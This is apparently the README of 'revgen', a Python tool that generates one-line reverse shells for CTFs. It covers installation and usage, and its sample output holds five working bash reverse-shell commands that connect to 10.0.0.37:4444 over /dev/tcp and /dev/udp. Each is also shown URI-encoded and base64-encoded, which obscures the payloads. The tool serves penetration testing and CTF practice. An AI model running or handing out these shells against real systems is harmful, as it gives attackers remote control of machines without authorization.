# The One-Liner Reverse Shell Generator 

> [!WARNING]\
LEGAL DISCLAIMER:\
This tool is STRICTLY for EDUCATIONAL PURPOSES ONLY!\
Usage of this tool for attacking targets without prior mutual consent is ILLEGAL.\
It is the user's responsibility to obey all laws that apply whilst using this tool.\
The developer of this tool assumes no liability and is not responsible for any misuse  or damage caused by this program.

## What is revgen?
Revgen is a simple script written in Python, used to generate one-line reverse shells. Perfect for use in CTFs.

## How does it work?
The script contains a dictionary data structure containing multiple different programming, scripting and executable languages as **keys** with corresponding reverse shells as **values**.

The script also allows for encoding the reverse shell scripts. The options are **URI Encoding** and **Base64** encoding.

## Features
**revgen** includes reverse shells for **21** different programming, scripting, and executable languages.

#### Reverse Shell Formats and Number of Reverse Shells:
- **bash** = 5
- **nc** = 4
- **ncat** = 2
- **curl** = 1
- **rustcat** = 1
- **Perl** = 2
- **PHP** = 7
- **Python** = 5
- **Ruby** = 2
- **socat** = 2
- **sqlite3** = 1
- **Node.JS** = 1
- **groovy** = 1
- **telnet** = 1
- **zsh** = 2
- **lua** = 2
- **golang** = 1
- **vlang** = 1
- **awk** = 1
- **crystal** = 1
- **powershell** = 4

## Requirements
The only requirement for this tool to run is that Python3 is installed.\
If it is not, you can install it using your favourite package manager.

### On Ubuntu/Debian (apt):
1. Update package list: `sudo apt update`
2. Install Python3: `sudo apt install python3`
3. Verify Installation: `python3 --version`

### On CentOS/RHEL (yum):
1. Enable EPEL Repository: `sudo yum install epel-release`
2. Install Python3: `sudo yum install python3`
3. Verify Installation: `python3 --version`

### On Fedora (dnf):
1. Install Python3: `sudo dnf install python3`
2. Verify Installation: `python3 --version`

### On Arch Linux (pacman):
1. Install Python3: `sudo pacman -S python`
2. Verify Installation: `python3 --version`

## Installation
1. Clone the repository to your machine:\
   `git clone https://github.com/acfirthh/revgen.git`
   
2. Change directory into the cloned repo and make the **installer.sh** script executable:\
   `cd revgen; chmod +x installer.sh`

3. Run the **installer.sh** script:\
   `./installer.sh`\
   If the script gets a **permission denied** error, then it should be run as root or using sudo:\
   `sudo ./installer.sh`

5. If the **installer.sh** script runs successfully, then the **revgen** script should be callable through the command line.

> If you attempt to call the script by running the command `revgen` and it fails, then you should make sure that the directory `/usr/local/bin` is in your **PATH environment variable**.

## Usage
### Basic Usage:
Generate reverse shells for a specified IP address, port and format:\
`revgen -l <IP_ADDRESS> -p <PORT> -f <REVERSE_SHELL_FORMAT>`

Example:\
`revgen -l 10.0.0.37 -p 4444 -f bash`

### Advanced Usage:
Generate reverse shells for a specified IP address, port and format, with encoding:\
`revgen -l <IP_ADDRESS> -p <PORT> -f <REVERSE_SHELL_FORMAT> -e <ENCODING>`

#### URI Encoded Payload:
Example:\
`revgen -l 10.0.0.37 -p 4444 -f bash -e U`

#### Base64 Encoded Payload:
Example:\
`revgen -l 10.0.0.37 -p 4444 -f bash -e B`

##### Expected Normal Output:
```
$ revgen -l 10.0.0.37 -p 4444 -f bash

Bash -i
-------------------------
bash -i >& /dev/tcp/10.0.0.37/4444 0>&1

Bash 196
-------------------------
0<&196;exec 196<>/dev/tcp/10.0.0.37/4444; bash <&196 >&196 2>&196

Bash read line
-------------------------
exec 5<>/dev/tcp/10.0.0.37/4444;cat <&5 | while read line; do $line 2>&5 >&5; done

Bash 5
-------------------------
bash -i 5<> /dev/tcp/10.0.0.37/4444 0<&5 1>&5 2>&5

Bash UDP
-------------------------
bash -i >& /dev/udp/10.0.0.37/4444 0>&1
```

##### With URI Encoding:
```
$ revgen -l 10.0.0.37 -p 4444 -f bash -e U

Bash -i
-------------------------
bash%20-i%20%3E%26%20/dev/tcp/10.0.0.37/4444%200%3E%261

Bash 196
-------------------------
0%3C%26196%3Bexec%20196%3C%3E/dev/tcp/10.0.0.37/4444%3B%20bash%20%3C%26196%20%3E%26196%202%3E%26196

Bash read line
-------------------------
exec%205%3C%3E/dev/tcp/10.0.0.37/4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done

Bash 5
-------------------------
bash%20-i%205%3C%3E%20/dev/tcp/10.0.0.37/4444%200%3C%265%201%3E%265%202%3E%265

Bash UDP
-------------------------
bash%20-i%20%3E%26%20/dev/udp/10.0.0.37/4444%200%3E%261
```

##### With Base64 Encoding:
```
$ revgen -l 10.0.0.37 -p 4444 -f bash -e B

Bash -i
-------------------------
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMzcvNDQ0NCAwPiYx

Bash 196
-------------------------
MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4wLjAuMzcvNDQ0NDsgYmFzaCA8JjE5NiA+JjE5NiAyPiYxOTY=

Bash read line
-------------------------
ZXhlYyA1PD4vZGV2L3RjcC8xMC4wLjAuMzcvNDQ0NDtjYXQgPCY1IHwgd2hpbGUgcmVhZCBsaW5lOyBkbyAkbGluZSAyPiY1ID4mNTsgZG9uZQ==

Bash 5
-------------------------
YmFzaCAtaSA1PD4gL2Rldi90Y3AvMTAuMC4wLjM3LzQ0NDQgMDwmNSAxPiY1IDI+JjU=

Bash UDP
-------------------------
YmFzaCAtaSA+JiAvZGV2L3VkcC8xMC4wLjAuMzcvNDQ0NCAwPiYx
```
